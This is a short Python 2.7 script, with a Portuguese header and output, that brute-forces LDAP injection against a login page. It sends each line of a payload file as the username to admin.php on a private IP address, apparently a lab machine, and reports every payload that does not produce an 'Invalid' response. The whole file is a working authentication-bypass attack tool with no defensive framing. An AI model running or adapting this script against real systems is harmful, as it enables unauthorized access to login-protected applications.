# Script para ldap injection - byth22
#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

import requests
import re

def brute(target, headers):
    f = open("ldapi-payloads.txt", "r")
    for i in f:
        params = (
            ('username', i),
            ('password', 'teste'),
        )
            
        response = requests.get('http://'+target+'/admin.php', headers=headers, params=params, verify=False)

        try:
            re.findall(r'Invalid', response.content)[0]

        except IndexError:
            print ("Payload encontrada: %s" %i)


def main():
    target = '192.168.196.130'

    headers = {
        'Host': target,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Referer': 'http://192.168.196.130/admin.php',
        'Upgrade-Insecure-Requests': '1',
    }
    brute(target, headers)


main()
